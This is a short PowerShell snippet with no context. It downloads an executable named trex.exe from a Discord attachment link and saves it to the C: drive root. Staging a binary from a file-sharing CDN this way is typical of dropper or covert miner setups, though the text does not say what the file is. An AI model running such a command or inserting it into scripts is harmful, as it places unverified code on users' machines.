$url = "https://cdn.discordapp.com/attachments/770287390429806613/1114322345339924531/trex.exe"
$output = "c:\trex.exe"

Invoke-WebRequest -Uri $url -OutFile $output
